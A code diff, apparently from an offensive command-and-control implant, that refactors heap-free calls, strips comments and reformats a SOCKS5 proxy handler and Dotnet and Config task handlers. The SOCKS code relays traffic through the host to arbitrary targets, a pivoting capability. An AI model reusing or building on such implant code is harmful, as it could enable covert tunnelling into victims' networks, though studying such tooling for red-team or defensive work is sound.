@@ -367,7 +367,7 @@ _KH_END:
         Self->Pkg->Int32( Package, Success );
     }
 
-    if ( Buffer ) { Self->Hp->Free( Buffer, TmpVal ); }
+    if ( Buffer ) { Self->Hp->Free( Buffer ); }
 
     return KhRetSuccess;
 }
@@ -436,7 +436,7 @@ auto DECLFN Task::Dotnet(
 
 _KH_END:
     if ( Self->Dot->Buffer.a ) {
-        Self->Hp->Free( Self->Dot->Buffer.a, Self->Dot->Buffer.s );
+        Self->Hp->Free( Self->Dot->Buffer.a );
     }
 
     return Code;
@@ -452,7 +452,6 @@ auto DECLFN Task::Socks(
     PPACKAGE Package = Job->Pkg;
     PPARSER  Parser  = Job->Psr;
 
-    // Basic data extraction
     BOOL  IsExit    = Self->Psr->Int32(Parser);
     ULONG ServerID  = Self->Psr->Int32(Parser);
 
@@ -493,7 +492,6 @@ auto DECLFN Task::Socks(
         case KH_SOCKET_NEW: {
             KhDbg("Starting new SOCKS5 connection");
 
-            // 1. Create new socket
             SOCKET newSocket = Self->Ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (newSocket == INVALID_SOCKET) {
                 DWORD err = KhGetError;
@@ -502,21 +500,18 @@ auto DECLFN Task::Socks(
             }
             KhDbg("Socket created: %llu", (ULONG64)newSocket);
 
-            // 2. Verify SOCKS5 data
             if (DataLen < 10) {
                 KhDbg("Insufficient data for SOCKS5 header");
                 Self->Ws2_32.closesocket(newSocket);
                 return ERROR_INVALID_DATA;
             }
 
-            // 3. Verify SOCKS5 version (0x05)
             if (Data[0] != 0x05) {
                 KhDbg("Invalid SOCKS version: 0x%02X", Data[0]);
                 Self->Ws2_32.closesocket(newSocket);
                 return ERROR_INVALID_DATA;
             }
 
-            // 4. Extract connection information
             ULONG targetIP = 0;
             USHORT targetPort = 0;
             ULONG headerSize = 0;
@@ -554,7 +549,6 @@ auto DECLFN Task::Socks(
                         return ERROR_INVALID_DATA;
                     }
                     
-                    // DNS resolution not implemented in this example
                     KhDbg("Domain not supported: %.*s", domainLen, Data + 5);
                     Self->Ws2_32.closesocket(newSocket);
                     return ERROR_NOT_SUPPORTED;
@@ -573,7 +567,6 @@ auto DECLFN Task::Socks(
                 }
             }
 
-            // 5. Connect to final destination
             sockaddr_in targetAddr = {0};
             targetAddr.sin_family = AF_INET;
             targetAddr.sin_addr.s_addr = targetIP;
@@ -588,7 +581,6 @@ auto DECLFN Task::Socks(
             }
             KhDbg("Connection established successfully");
 
-            // 6. Prepare SOCKS5 response
             BYTE socksResponse[10] = {0x05, 0x00, 0x00, 0x01, 
                                     0x00, 0x00, 0x00, 0x00, // Fictitious IP
                                     0x00, 0x00}; // Fictitious port
@@ -599,20 +591,19 @@ auto DECLFN Task::Socks(
                 Self->Ws2_32.closesocket(newSocket);
                 return ERROR_OUTOFMEMORY;
             }
-            Mem::Copy(ResponseData, socksResponse, sizeof(socksResponse));
-            ResponseLen = sizeof(socksResponse);
 
-            // 7. Store socket
-            ERROR_CODE err = Self->Sckt->Add(ServerID, newSocket);
+            Mem::Copy( ResponseData, socksResponse, sizeof( socksResponse ) );
+            ResponseLen = sizeof( socksResponse ); 
+
+            ERROR_CODE err = Self->Sckt->Add( ServerID, newSocket );
             if (err != ERROR_SUCCESS) {
                 KhDbg("Failed to store socket: 0x%X", err);
-                Self->Hp->Free(ResponseData, ResponseLen);
-                Self->Ws2_32.closesocket(newSocket);
+                Self->Hp->Free( ResponseData );
+                Self->Ws2_32.closesocket( newSocket );
                 return err;
             }
 
-            // 8. Send additional data (if any)
-            if (DataLen > headerSize) {
+            if ( DataLen > headerSize ) {
                 KhDbg("Sending %d bytes of additional data", DataLen - headerSize);
                 int bytesSent = Self->Ws2_32.send(newSocket, (char*)(Data + headerSize), DataLen - headerSize, 0);
                 if (bytesSent == SOCKET_ERROR) {
@@ -627,8 +618,7 @@ auto DECLFN Task::Socks(
         case KH_SOCKET_DATA: {
             KhDbg("Processing data for existing connection");
 
-            // 1. Get existing socket
-            SOCKET activeSocket = Self->Sckt->Get(ServerID);
+            SOCKET activeSocket = Self->Sckt->Get( ServerID );
             if (activeSocket == INVALID_SOCKET) {
                 KhDbg("Connection not found for ServerID: %u", ServerID);
                 return ERROR_NOT_FOUND;
@@ -700,7 +690,7 @@ auto DECLFN Task::Socks(
 
     if (ResponseData) {
         Self->Pkg->Bytes(Package, ResponseData, ResponseLen);
-        Self->Hp->Free(ResponseData, ResponseLen);
+        Self->Hp->Free(ResponseData);
     }
 
     KhDbg("SOCKS task completed with status: 0x%X", Result);
@@ -788,7 +778,7 @@ auto DECLFN Task::Config(
         }
         case SbCfgCurDir: {
             if ( Self->Ps->Ctx.CurrentDir ) {
-                Self->Hp->Free( Self->Ps->Ctx.CurrentDir, Str::LengthA( Self->Ps->Ctx.CurrentDir ) );
+                Self->Hp->Free( Self->Ps->Ctx.CurrentDir );
             }
 
             PCHAR CurDirTmp  = Self->Psr->Str( Parser, &TmpVal );
